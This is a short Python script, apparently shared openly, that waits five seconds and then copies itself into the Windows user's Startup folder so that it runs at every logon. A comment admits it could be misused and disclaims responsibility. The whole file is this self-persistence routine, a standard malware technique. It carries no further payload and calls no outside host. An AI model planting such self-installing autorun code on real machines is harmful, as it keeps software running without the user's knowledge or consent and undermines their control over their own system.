# yes i am aware this could be misused  but i am not responsible for any damage by using this you are Responsible for your own Actions.

import os
import time
import shutil
from pathlib import Path

# optional but add if you want to add a delay

time.sleep(5)

current_file = os.path.abspath(__file__)
startup_folder = Path(os.path.expanduser("~")) / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
startup_file_dir = startup_folder / Path(current_file).name

if not startup_file_dir.exists():
    shutil.copy(current_file, startup_file_dir)
